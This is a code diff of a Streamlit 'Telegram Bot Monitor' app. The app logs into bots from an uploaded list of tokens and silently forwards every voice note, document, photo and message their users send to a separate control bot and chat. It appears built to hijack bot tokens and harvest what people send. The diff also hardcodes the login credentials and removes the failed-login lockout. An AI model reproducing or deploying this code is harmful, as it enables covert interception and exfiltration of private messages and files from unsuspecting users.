@@ -1,17 +1,48 @@
 import streamlit as st
-from streamlit.components.v1 import html
 import asyncio
-from bot_monitor import BotMonitor
-import time
-import threading
 import os
+import json
+import random
+import requests
+from telethon import TelegramClient, events
 
-# Custom CSS and JS
+# Configuration
+CONFIG_FILE = "config.json"
+
+# Load configuration
+def load_config():
+    try:
+        with open(CONFIG_FILE) as f:
+            return json.load(f)
+    except (FileNotFoundError, json.JSONDecodeError):
+        return {
+            "api_id": "",
+            "api_hash": "",
+            "bot_token": "",
+            "chat_id": ""
+        }
+
+def save_config(config):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(config, f, indent=4)
+
+def generate_random_name():
+    vowels = ["a", "e", "i", "o", "u", "p", "s", "t", "v", "x", "q", "r"]
+    cons = ["b", "c", "d", "f", "g", "j", "k", "l", "m", "n", "h"]
+    postal = ["b", "c", "d", "f", "g", "j", "k", "l", "m", "n", "h"]
+    randomNumber = random.randint(5, 8)
+    name = "NEW REZULT BOTS"
+    for x in range(randomNumber):
+        name += random.choice(vowels) + random.choice(cons) + random.choice(postal)
+    return name
+
+# Custom CSS
 def inject_custom_css():
     st.markdown("""
     <style>
         .main {
             background-color: #0e1117;
+            color: white;
         }
         .stButton>button {
             background-color: #4CAF50;
@@ -28,6 +59,9 @@ def inject_custom_css():
         }
         .stop-button>button {
             background-color: #f44336 !important;
+        }
+        .logout-button>button {
+            background-color: #ff9800 !important;
         }
         .log-table {
             background-color: #1e1e1e;
@@ -62,32 +96,10 @@ def inject_custom_css():
     </style>
     """, unsafe_allow_html=True)
 
-    # Add some animations
-    html("""
-    <script>
-    // Simple animation for buttons
-    document.addEventListener('DOMContentLoaded', function() {
-        const buttons = document.querySelectorAll('.stButton>button');
-        buttons.forEach(button => {
-            button.addEventListener('mouseover', function() {
-                this.style.transform = 'scale(1.05)';
-            });
-            button.addEventListener('mouseout', function() {
-                this.style.transform = 'scale(1)';
-            });
-        });
-    });
-    </script>
-    """)
-
 # Login system
-def login():
+def login_page():
     st.markdown("<div class='login-container'>", unsafe_allow_html=True)
     st.title("🔒 Bot Monitor Login")
-    
-    # Initialize session state
-    if 'login_attempts' not in st.session_state:
-        st.session_state.login_attempts = 0
     
     username = st.text_input("Username")
     password = st.text_input("Password", type="password")
@@ -95,92 +107,147 @@ def login():
     if st.button("Login"):
         if username == "wolf" and password == "firas":
             st.session_state.logged_in = True
-            st.session_state.login_attempts = 0
             st.rerun()
         else:
-            st.session_state.login_attempts += 1
-            if st.session_state.login_attempts >= 3:
-                st.error("Too many failed attempts. Please try again later.")
-            else:
-                st.error(f"Invalid credentials. Attempt {st.session_state.login_attempts}/3")
+            st.error("Invalid credentials")
     
     st.markdown("</div>", unsafe_allow_html=True)
 
-# Main application
+async def run_bot_monitor():
+    config = load_config()
+    if 'bot_tokens' not in st.session_state or not st.session_state.bot_tokens:
+        return
+    
+    clients = []
+    
+    for token in st.session_state.bot_tokens:
+        try:
+            # Session file saved in main directory (no SESSION_DIR)
+            session_file = f"session_{token}.session"
+            client = TelegramClient(session_file, config['api_id'], config['api_hash'])
+            clients.append(client)
+            await client.start(bot_token=token)
+            st.session_state.logs.append(f'[+] Bot started with token: {token[:10]}...')
+
+            async def event_handler(event):
+                try:
+                    await event.get_chat()
+                    name = event.sender.username or str(event.sender_id)
+                    
+                    if event.raw_text and len(event.raw_text.strip()) < 10:
+                        return
+
+                    if event.voice:
+                        voice = await event.download_media(file='voice')
+                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendvoice?chat_id={config['chat_id']}"
+                        files = {'voice': open(voice, 'rb')}
+                        requests.post(url, files=files)
+                        st.session_state.logs.append(f'[+] Voice from @{name}')
+
+                    elif event.document:
+                        media = await event.download_media(file='file')
+                        url = f"https://api.telegram.org/bot{config['bot_token']}/senddocument?chat_id={config['chat_id']}"
+                        files = {'document': open(media, 'rb')}
+                        requests.post(url, files=files)
+                        st.session_state.logs.append(f'[+] Document from @{name}')
+
+                    elif event.media and hasattr(event.media, 'photo'):
+                        photo = await event.download_media()
+                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendphoto?chat_id={config['chat_id']}"
+                        files = {'photo': open(photo, 'rb')}
+                        requests.post(url, files=files)
+                        st.session_state.logs.append(f'[+] Photo from @{name}')
+
+                    elif event.raw_text not in ['ㅤ', '.', '/start', 'Hashtag : ma9souda', 'ID Message:']:
+                        text = event.raw_text.replace('#', '').replace('&', '')
+                        url = f"https://api.telegram.org/bot{config['bot_token']}/sendmessage?chat_id={config['chat_id']}&text=FROM BOT : @{name}\n\n{text}"
+                        requests.post(url)
+                        st.session_state.logs.append(f'[+] Message from @{name}')
+
+                except Exception as e:
+                    st.session_state.logs.append(f'[!] Error: {str(e)}')
+
+            client.add_event_handler(event_handler, events.NewMessage)
+
+        except Exception as e:
+            st.session_state.logs.append(f'[!] Failed to start bot: {str(e)}')
+
+    st.session_state.logs.append("[+] All bots started successfully")
+    while st.session_state.monitor_running:
+        await asyncio.sleep(1)
+
+    for client in clients:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
 def main_app():
     inject_custom_css()
     
-    st.title("🤖 Telegram Bot Monitor")
+    # Header with logout button
+    col1, col2 = st.columns([4, 1])
+    col1.title("🤖 Telegram Bot Monitor")
+    if col2.button("🚪 Logout", key="logout", help="Click to logout"):
+        st.session_state.logged_in = False
+        st.session_state.monitor_running = False
+        st.rerun()
     st.markdown("---")
     
-    # Initialize bot monitor in session state
-    if 'bot_monitor' not in st.session_state:
-        st.session_state.bot_monitor = None
-        st.session_state.monitor_thread = None
+    # Initialize session state
+    if 'logs' not in st.session_state:
+        st.session_state.logs = []
+    if 'monitor_running' not in st.session_state:
+        st.session_state.monitor_running = False
+    if 'bot_tokens' not in st.session_state:
+        st.session_state.bot_tokens = []
     
-    # Configuration section
+    config = load_config()
+    
     with st.expander("⚙️ Configuration", expanded=True):
-        col1, col2 = st.columns(2)
-        api_id = col1.text_input("API ID", value="your_api_id")
-        api_hash = col2.text_input("API Hash", value="your_api_hash", type="password")
+        new_config = {
+            "api_id": st.text_input("API ID", value=config['api_id']),
+            "api_hash": st.text_input("API Hash", value=config['api_hash'], type="password"),
+            "bot_token": st.text_input("Control Bot Token", value=config['bot_token']),
+            "chat_id": st.text_input("Control Chat ID", value=config['chat_id'])
+        }
         
-        col1, col2 = st.columns(2)
-        control_bot_token = col1.text_input("Control Bot Token", value="your_control_bot_token")
-        control_chat_id = col2.text_input("Control Chat ID", value="your_control_chat_id")
-        
-        uploaded_file = st.file_uploader("📁 Upload Bot Tokens (txt file)", type=["txt"])
-        
-        if uploaded_file is not None:
-            file_content = uploaded_file.getvalue().decode("utf-8")
-            st.session_state.bot_monitor = BotMonitor(
-                api_id, api_hash, control_bot_token, control_chat_id
-            )
-            st.session_state.bot_monitor.load_tokens(file_content)
-            st.success(f"Loaded {len(st.session_state.bot_monitor.bot_tokens)} bot tokens")
+        if st.button("Save Config"):
+            save_config(new_config)
+            st.success("Configuration saved!")
     
-    # Control buttons
+    uploaded_file = st.file_uploader("📁 Upload Bot Tokens (txt file)", type=["txt"])
+    
+    if uploaded_file:
+        st.session_state.bot_tokens = [x.strip() for x in uploaded_file.getvalue().decode().split('\n') if x.strip()]
+        st.session_state.logs.append(f"[+] Loaded {len(st.session_state.bot_tokens)} bot tokens")
+    
     col1, col2 = st.columns(2)
-    start_btn = col1.button("🚀 Start Monitoring", key="start")
-    stop_btn = col2.button("🛑 Stop Monitoring", key="stop", disabled=not st.session_state.get('bot_monitor'))
+    if col1.button("🚀 Start Monitoring", disabled=not st.session_state.bot_tokens or st.session_state.monitor_running):
+        st.session_state.monitor_running = True
+        st.session_state.monitor_task = asyncio.create_task(run_bot_monitor())
+        st.session_state.logs.append("[+] Monitoring started")
     
-    if start_btn and st.session_state.bot_monitor:
-        if not st.session_state.bot_monitor.is_running:
-            def run_async():
-                asyncio.run(st.session_state.bot_monitor.start_bots())
-            
-            st.session_state.monitor_thread = threading.Thread(target=run_async)
-            st.session_state.monitor_thread.start()
-            st.success("Monitoring started!")
-        else:
-            st.warning("Monitoring is already running")
+    if col2.button("🛑 Stop Monitoring", disabled=not st.session_state.monitor_running):
+        st.session_state.monitor_running = False
+        st.session_state.logs.append("[+] Monitoring stopped")
     
-    if stop_btn and st.session_state.bot_monitor:
-        if st.session_state.bot_monitor.is_running:
-            asyncio.run(st.session_state.bot_monitor.stop_bots())
-            st.success("Monitoring stopped!")
-        else:
-            st.warning("Monitoring is not running")
-    
-    # Log display
-    st.markdown("## 📜 Activity Log")
+    st.subheader("📜 Activity Log")
     log_container = st.empty()
     
-    # Update logs in real-time
-    if 'bot_monitor' in st.session_state and st.session_state.bot_monitor:
-        logs = st.session_state.bot_monitor.logs
-        if logs:
-            log_html = "<div class='log-table'>"
-            for log in logs[-20:]:  # Show last 20 logs
-                log_class = "info-log"
-                if "Success" in log or "Forwarded" in log:
-                    log_class = "success-log"
-                elif "Error" in log or "Failed" in log:
-                    log_class = "error-log"
-                log_html += f"<div class='log-entry {log_class}'>{log}</div>"
-            log_html += "</div>"
-            log_container.markdown(log_html, unsafe_allow_html=True)
+    # Update logs
+    if st.session_state.logs:
+        log_html = "<div class='log-table'>"
+        for log in st.session_state.logs[-20:]:
+            log_class = "info-log"
+            if "[+]" in log:
+                log_class = "success-log"
+            elif "[!]" in log:
+                log_class = "error-log"
+            log_html += f"<div class='log-entry {log_class}'>{log}</div>"
+        log_html += "</div>"
+        log_container.markdown(log_html, unsafe_allow_html=True)
 
-# App flow
 def app():
     if 'logged_in' not in st.session_state:
         st.session_state.logged_in = False
@@ -188,7 +255,7 @@ def app():
     if st.session_state.logged_in:
         main_app()
     else:
-        login()
+        login_page()
 
 if __name__ == "__main__":
     app()
